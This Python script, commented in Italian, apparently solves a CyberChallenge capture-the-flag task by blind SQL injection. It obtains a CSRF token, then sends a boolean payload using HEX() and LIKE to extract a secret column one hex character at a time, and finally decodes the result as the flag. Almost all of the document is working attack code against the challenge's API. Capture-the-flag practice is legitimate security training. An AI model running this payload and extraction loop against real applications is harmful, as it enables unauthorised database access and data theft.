import requests
import binascii

# ==============================================================================
# CLASSE FORNITA DALLA CHALLENGE (Gestione Sessione e Token API)
# ==============================================================================
class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        # Assicuriamoci che l'URL sia formattato correttamente
        host = host.rstrip('/')
        self.base_url = f'{host}/api/'
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token').json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        # Aggiunto un timeout di 10 secondi per evitare blocchi di rete
        return self.sess.post(url, json=data, headers=headers, timeout=10).json()

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response.get('sql_error', '')

# ==============================================================================
# SCRIPT DI ATTACCO BLIND SQLi (Hex-Encoded)
# ==============================================================================

# 1. Inizializziamo l'oggetto puntando al server della challenge
host = 'http://sqlinjection.challs.cyberchallenge.it'
print(f"[*] Connessione a {host} per ottenere il token CSRF...")
try:
    inj = Inj(host)
    print("[+] Token ottenuto! Avvio estrazione Blind SQLi...")
except Exception as e:
    print(f"[-] Errore di connessione o risoluzione DNS. Controlla la rete/VPN della VM!\nDettagli: {e}")
    exit(1)

# 2. Impostiamo il payload e il dizionario Esadecimale fornito dalle istruzioni
payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
dictionary = '0123456789abcdef'
result = ''

# 3. Ciclo di estrazione
while True:
    for c in dictionary:
        # Costruiamo la query concatenando ciò che abbiamo già trovato con la nuova lettera
        question = payload.format(result + c)
        
        # Stampiamo a video il tentativo in tempo reale
        print(f"[*] Test stringa HEX: {result + c}", end='\r')
        
        # Interroghiamo l'API
        response, error = inj.blind(question)
        
        if response == 'Success':
            result += c
            print(f"\n[+] Trovato match HEX parziale: {result}")
            break # Usciamo dal ciclo 'for' per ricominciare il 'while' con la lettera successiva
            
    else:
        # Questo blocco 'else' appartiene al 'for', non all'if!
        # Si attiva solo se il ciclo for termina TUTTO il dizionario senza fare 'break'.
        # Significa che non ci sono più lettere da trovare: abbiamo l'intera stringa!
        break 

print(f"\n\n[*] Estrazione Hex completata: {result}")

# 4. Convertiamo la stringa Esadecimale estratta in testo leggibile (ASCII)
if result:
    try:
        # bytes.fromhex decodifica l'hex, .decode() lo trasforma in stringa di testo
        flag = bytes.fromhex(result).decode('utf-8')
        print("="*50)
        print(f"[!] FLAG DECIFRATA: {flag}")
        print("="*50)
    except Exception as e:
        print(f"[-] Errore nella conversione in testo leggibile: {e}")
else:
    print("[-] Nessun dato estratto.")